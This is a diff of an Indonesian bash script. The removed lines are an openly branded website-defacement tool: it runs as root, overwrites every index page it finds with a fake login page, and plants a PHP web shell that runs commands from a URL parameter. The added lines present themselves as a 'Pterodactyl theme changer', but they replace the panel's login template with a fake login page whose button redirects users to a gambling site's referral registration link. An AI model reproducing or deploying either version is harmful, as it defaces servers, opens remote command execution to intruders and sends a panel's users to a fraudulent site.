@@ -1,29 +1,18 @@
 #!/bin/bash
 
-# ==============================================
-# R3NDZZ TOOLS - DEFACE & PULIHKAN
-# [ Simple 2 Menu ]
-# ==============================================
-
+# Warna untuk output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-WHITE='\033[1;37m'
-NC='\033[0m'
+NC='\033[0m' # No Color
 
-# ==============================================
-# KONFIGURASI
-# ==============================================
-BACKUP_DIR="/root/backup_web_$(date +%Y%m%d_%H%M%S)"
-IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
+# Direktori panel Pterodactyl
+PTERODACTYL_DIR="/var/www/pterodactyl"
+BACKUP_DIR="/root/pterodactyl-backup"
 
-# ==============================================
-# HTML DEFACE - PWND BY R3NDZZ
-# ==============================================
-HTML_CONTENT='<!DOCTYPE html>
+# Tampilan HTML baru
+NEW_HTML='<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="utf-8" />
@@ -42,12 +31,12 @@ HTML_CONTENT='<!DOCTYPE html>
     body {  
       min-height: 100dvh;  
       overflow-y: auto;  
-      font-family: &#39;Roboto&#39;, sans-serif;  
+      font-family: '\''Roboto'\'', sans-serif;  
       background-color: #374150;  
     }  
 
     body::before {
-      content: &#34;&#34;;
+      content: "";
       position: fixed;
       top: 0;
       left: 0;
@@ -108,246 +97,192 @@ HTML_CONTENT='<!DOCTYPE html>
     <script src="https://www.google.com/recaptcha/api.js?render=6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL" async="" defer="">
     </script>
     <script>
-      window.addEventListener(&#34;load&#34;, () =&gt; {
-      if (typeof grecaptcha !== &#34;undefined&#34;) {
-        grecaptcha.ready(() =&gt; {
-          grecaptcha.execute(&#39;6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL&#39;, {action: &#39;login&#39;}).then(token =&gt; {
-            console.log(&#39;Decorative token:&#39;, token);
+      window.addEventListener("load", () => {
+      if (typeof grecaptcha !== "undefined") {
+        grecaptcha.ready(() => {
+          grecaptcha.execute('\''6LceAZIrAAAAACaj77El6PubR6nAPpARAA1TUDCL'\'', {action: '\''login'\''}).then(token => {
+            console.log('\''Decorative token:'\'', token);
           });
         });
       }
     });
 
     async function onSubmit() {  
-      const loginBtn = document.getElementById(&#34;loginBtn&#34;);
-      const loginText = document.getElementById(&#34;loginText&#34;);
-      const miniSpinner = document.getElementById(&#34;miniSpinner&#34;);
-      const spinner = document.getElementById(&#34;spinner-bg&#34;);
+      const loginBtn = document.getElementById("loginBtn");
+      const loginText = document.getElementById("loginText");
+      const miniSpinner = document.getElementById("miniSpinner");
+      const spinner = document.getElementById("spinner-bg");
 
+      // Disable button and show mini spinner
       loginBtn.disabled = true;
-      loginBtn.classList.add(&#34;bg-blue-400&#34;);
-      loginBtn.classList.remove(&#34;hover:bg-[#2563eb]&#34;);
-      loginText.classList.add(&#34;invisible&#34;);
-      miniSpinner.classList.remove(&#34;hidden&#34;);
+      loginBtn.classList.add("bg-blue-400");
+      loginBtn.classList.remove("hover:bg-[#2563eb]");
+      loginText.classList.add("invisible");
+      miniSpinner.classList.remove("hidden");
 
-      await new Promise(r =&gt; setTimeout(r, 1000));
-      spinner.classList.remove(&#34;hidden&#34;);
+      // Show fullscreen spinner after a short delay
+      await new Promise(r => setTimeout(r, 1000));
+      spinner.classList.remove("hidden");
 
-      try {  
-        await new Promise(r =&gt; setTimeout(r, 2500));
-        document.body.innerHTML = `
-          &lt;video id=&#34;rick&#34;
-                 src=&#34;Rick.mp4&#34;
-                 style=&#34;position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:9999;&#34;
-                 autoplay
-                 playsinline&gt;
-          &lt;/video&gt;
-        `;
-        document.getElementById(&#39;rick&#39;).play().catch(err =&gt; console.error(err));
-      } 
-      catch (err) {  
-        console.error(err);
-      } 
-      finally {  
-        spinner.classList.add(&#34;hidden&#34;);
-      }  
+      // Redirect to the target link
+      window.location.href = "https://congtogelbiz.com/register?referral_code=rndzz";
     }
 
-    document.getElementById(&#34;loginBtn&#34;).addEventListener(&#34;click&#34;, onSubmit);
+    document.getElementById("loginBtn").addEventListener("click", onSubmit);
     </script>
   </body>
 </html>'
 
-# ==============================================
-# HEADER
-# ==============================================
-show_header() {
+# Fungsi untuk menampilkan banner
+show_banner() {
     clear
-    echo -e "${RED}"
-    echo "    ╔═══════════════════════════════════════════════════════════╗"
-    echo "    ║              R3NDZZ TOOLS - DEFACE & PULIHKAN             ║"
-    echo "    ║                    [ PWND BY R3NDZZ ]                     ║"
-    echo "    ╚═══════════════════════════════════════════════════════════╝"
-    echo -e "${NC}"
-    echo -e "${CYAN}📡 IP VPS: ${GREEN}$IP_VPS${NC}"
+    echo -e "${BLUE}================================${NC}"
+    echo -e "${GREEN}   PTERODACTYL THEME CHANGER    ${NC}"
+    echo -e "${BLUE}================================${NC}"
     echo ""
 }
 
-# ==============================================
-# FUNGSI BACKUP
-# ==============================================
-backup_files() {
-    echo -e "\n${YELLOW}[•] Membackup file website...${NC}"
+# Fungsi untuk mengecek apakah Pterodactyl terinstall
+check_pterodactyl() {
+    if [ ! -d "$PTERODACTYL_DIR" ]; then
+        echo -e "${RED}Error: Pterodactyl tidak ditemukan di $PTERODACTYL_DIR${NC}"
+        exit 1
+    fi
+    
+    if [ ! -f "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php" ]; then
+        echo -e "${RED}Error: File auth.blade.php tidak ditemukan${NC}"
+        exit 1
+    fi
+}
+
+# Fungsi untuk backup file asli
+backup_original() {
+    echo -e "${YELLOW}Membuat backup file asli...${NC}"
+    
+    # Buat direktori backup jika belum ada
     mkdir -p "$BACKUP_DIR"
     
-    # Cari file index.html dan index.php
-    find / -type f \( -name "index.html" -o -name "index.php" -o -name "*.blade.php" \) 2>/dev/null | while read file; do
-        if [ -f "$file" ]; then
-            backup_path="$BACKUP_DIR$(echo "$file" | sed 's|/|_|g')"
-            cp "$file" "$backup_path" 2>/dev/null
-            echo -e "${GREEN}    ✅ Backup: $file${NC}"
-        fi
-    done
+    # Backup file auth.blade.php
+    cp "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php" "$BACKUP_DIR/auth.blade.php.backup-$(date +%Y%m%d-%H%M%S)"
     
-    # Backup juga file konfigurasi penting
-    [ -f "/etc/nginx/nginx.conf" ] && cp "/etc/nginx/nginx.conf" "$BACKUP_DIR/nginx.conf" 2>/dev/null
-    [ -f "/etc/apache2/apache2.conf" ] && cp "/etc/apache2/apache2.conf" "$BACKUP_DIR/apache2.conf" 2>/dev/null
-    
-    echo -e "\n${GREEN}✅ Backup selesai di: $BACKUP_DIR${NC}"
+    echo -e "${GREEN}Backup berhasil dibuat di $BACKUP_DIR${NC}"
 }
 
-# ==============================================
-# FUNGSI DEFACE
-# ==============================================
-deface() {
-    echo -e "\n${PURPLE}🎨 ====== DEFACE WEBSITE ====== 🎨${NC}"
+# Fungsi untuk mengubah tampilan
+ubah_tampilan() {
+    echo -e "${YELLOW}Mengubah tampilan panel Pterodactyl...${NC}"
     
-    # Backup dulu sebelum deface
-    backup_files
+    # Backup dulu
+    backup_original
     
-    # Simpan HTML ke file sementara
-    echo "$HTML_CONTENT" > /tmp/r3ndzz.html
+    # Tulis HTML baru ke file auth.blade.php
+    echo "$NEW_HTML" > "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php"
     
-    echo -e "\n${YELLOW}[•] Mencari target deface...${NC}"
+    # Clear cache
+    cd "$PTERODACTYL_DIR"
+    php artisan view:clear
+    php artisan cache:clear
     
-    # Lokasi umum website
-    TARGETS=(
-        "/var/www/html/index.html"
-        "/var/www/html/index.php"
-        "/var/www/pterodactyl/public/index.html"
-        "/var/www/pterodactyl/public/index.php"
-        "/home/*/public_html/index.html"
-        "/home/*/public_html/index.php"
-        "/usr/local/www/index.html"
-        "/opt/lampp/htdocs/index.html"
-        "/var/www/nginx/html/index.html"
-    )
-    
-    COUNT=0
-    for target in "${TARGETS[@]}"; do
-        eval "for f in $target; do
-            if [ -f \"\$f\" ]; then
-                cp /tmp/r3ndzz.html \"\$f\" 2>/dev/null
-                echo -e \"${GREEN}    ✅ \$f${NC}\"
-                ((COUNT++))
-            fi
-        done" 2>/dev/null
-    done
-    
-    # Cari file index lainnya
-    find / -type f -name "index.html" -o -name "index.php" 2>/dev/null | head -30 | while read file; do
-        if [ -f "$file" ] && [ -w "$file" ]; then
-            cp /tmp/r3ndzz.html "$file" 2>/dev/null
-            echo -e "${GREEN}    ✅ $file${NC}"
-            ((COUNT++))
-        fi
-    done
-    
-    echo -e "\n${GREEN}✅ Total $COUNT file berhasil dideface!${NC}"
-    
-    # Info backdoor sederhana
-    echo "<?php echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>'; ?>" > /var/www/html/r3ndzz.php 2>/dev/null
-    echo -e "\n${CYAN}🔗 Backdoor: http://$IP_VPS/r3ndzz.php?cmd=id${NC}"
-    
-    rm -f /tmp/r3ndzz.html
+    echo -e "${GREEN}Tampilan berhasil diubah!${NC}"
 }
 
-# ==============================================
-# FUNGSI PULIHKAN
-# ==============================================
-pulihkan() {
-    echo -e "\n${BLUE}🔄 ====== PULIHKAN WEBSITE ====== 🔄${NC}"
+# Fungsi untuk memulihkan tampilan asli
+pulihkan_tampilan() {
+    echo -e "${YELLOW}Memulihkan tampilan asli...${NC}"
     
-    # Cari semua backup
-    BACKUPS=($(ls -d /root/backup_web_* 2>/dev/null))
+    # Cari file backup terbaru
+    LATEST_BACKUP=$(ls -t "$BACKUP_DIR"/auth.blade.php.backup-* 2>/dev/null | head -n1)
     
-    if [ ${#BACKUPS[@]} -eq 0 ]; then
-        echo -e "${RED}❌ Tidak ada backup ditemukan!${NC}"
-        return
-    fi
-    
-    echo -e "${YELLOW}Pilih backup yang ingin dipulihkan:${NC}"
-    for i in "${!BACKUPS[@]}"; do
-        echo -e "${GREEN}[$i]${NC} ${BACKUPS[$i]}"
-    done
-    
-    echo -ne "\n${CYAN}Pilih nomor backup: ${NC}"
-    read choice
-    
-    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -lt "${#BACKUPS[@]}" ]; then
-        SELECTED="${BACKUPS[$choice]}"
+    if [ -f "$LATEST_BACKUP" ]; then
+        # Pulihkan dari backup
+        cp "$LATEST_BACKUP" "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php"
         
-        echo -e "\n${YELLOW}[•] Memulihkan dari $SELECTED...${NC}"
+        # Clear cache
+        cd "$PTERODACTYL_DIR"
+        php artisan view:clear
+        php artisan cache:clear
         
-        # Restore file backup
-        find "$SELECTED" -type f | while read backup; do
-            filename=$(basename "$backup")
-            # Cari file asli berdasarkan pattern
-            original_path=$(find / -name "*${filename#*_}" 2>/dev/null | head -1)
-            if [ -n "$original_path" ]; then
-                cp "$backup" "$original_path" 2>/dev/null
-                echo -e "${GREEN}    ✅ Pulihkan: $original_path${NC}"
-            fi
-        done
-        
-        echo -e "\n${GREEN}✅ Pemulihan selesai!${NC}"
+        echo -e "${GREEN}Tampilan berhasil dipulihkan!${NC}"
     else
-        echo -e "${RED}Pilihan tidak valid!${NC}"
+        echo -e "${RED}Error: Tidak ditemukan file backup${NC}"
+        exit 1
     fi
 }
 
-# ==============================================
-# FUNGSI SHOW MENU
-# ==============================================
-show_menu() {
-    show_header
-    
-    echo -e "${WHITE}╔════════════════════════════════════════════════╗${NC}"
-    echo -e "${WHITE}║                 MENU UTAMA                     ║${NC}"
-    echo -e "${WHITE}╠════════════════════════════════════════════════╣${NC}"
-    echo -e "${WHITE}║                                                ║${NC}"
-    echo -e "${WHITE}║  ${GREEN}[1]${NC} 🎨  DEFACE WEBSITE                   ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${GREEN}[2]${NC} 🔄  PULIHKAN WEBSITE                 ${WHITE}║${NC}"
-    echo -e "${WHITE}║  ${GREEN}[0]${NC} 🚪  KELUAR                           ${WHITE}║${NC}"
-    echo -e "${WHITE}║                                                ║${NC}"
-    echo -e "${WHITE}╚════════════════════════════════════════════════╝${NC}"
+# Fungsi untuk memulihkan semua seperti baru (reset total)
+reset_total() {
+    echo -e "${YELLOW}Memulihkan semua seperti baru...${NC}"
+    echo -e "${RED}PERINGATAN: Ini akan mengembalikan panel ke pengaturan awal!${NC}"
+    read -p "Apakah Anda yakin? (y/n): " -n 1 -r
     echo ""
-    echo -ne "${YELLOW}➤ Pilih menu [0-2]: ${NC}"
+    
+    if [[ $REPLY =~ ^[Yy]$ ]]; then
+        # Hapus semua backup
+        rm -rf "$BACKUP_DIR"/*
+        
+        # Buat file auth.blade.php baru dengan konten default Pterodactyl
+        cat > "$PTERODACTYL_DIR/resources/views/templates/auth.blade.php" << 'EOF'
+<!DOCTYPE html>
+<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
+
+    <title>@yield('title') | {{ config('app.name', 'Pterodactyl') }}</title>
+
+    @include('layouts.scripts')
+</head>
+<body class="bg-neutral-50 dark:bg-neutral-900">
+    @yield('content')
+</body>
+</html>
+EOF
+        
+        # Clear cache
+        cd "$PTERODACTYL_DIR"
+        php artisan view:clear
+        php artisan cache:clear
+        
+        echo -e "${GREEN}Panel berhasil direset ke tampilan default!${NC}"
+    else
+        echo -e "${YELLOW}Reset dibatalkan${NC}"
+    fi
 }
 
-# ==============================================
-# CEK ROOT
-# ==============================================
-if [[ $EUID -ne 0 ]]; then
-   echo -e "${RED}❌ Harus root! Jalankan dengan sudo.${NC}"
-   exit 1
-fi
+# Menu utama
+show_banner
+check_pterodactyl
 
-# ==============================================
-# MAIN LOOP
-# ==============================================
-while true; do
-    show_menu
-    read choice
-    
-    case $choice in
-        1)
-            deface
-            ;;
-        2)
-            pulihkan
-            ;;
-        0)
-            echo -e "\n${GREEN}Terima kasih telah menggunakan R3NDZZ Tools!${NC}"
-            echo -e "${CYAN}🔥 PWND BY R3NDZZ 🔥${NC}\n"
-            exit 0
-            ;;
-        *)
-            echo -e "\n${RED}Pilihan tidak valid!${NC}"
-            ;;
-    esac
-    
-    echo ""
-    echo -ne "${CYAN}Tekan Enter untuk kembali ke menu...${NC}"
-    read
-done
+echo -e "Pilih opsi:"
+echo -e "1) ${GREEN}Ubah tampilan${NC} - Mengubah tampilan login panel"
+echo -e "2) ${BLUE}Pulihkan semua!${NC} - Memulihkan semua seperti baru (reset total)"
+echo -e "3) ${YELLOW}Pulihkan tampilan asli${NC} - Kembali ke tampilan sebelum diubah"
+echo -e "4) Keluar"
+echo ""
+
+read -p "Masukkan pilihan [1-4]: " pilihan
+
+case $pilihan in
+    1)
+        ubah_tampilan
+        ;;
+    2)
+        reset_total
+        ;;
+    3)
+        pulihkan_tampilan
+        ;;
+    4)
+        echo -e "${YELLOW}Keluar...${NC}"
+        exit 0
+        ;;
+    *)
+        echo -e "${RED}Pilihan tidak valid!${NC}"
+        exit 1
+        ;;
+esac
+
+echo ""
+echo -e "${GREEN}Selesai!${NC}"
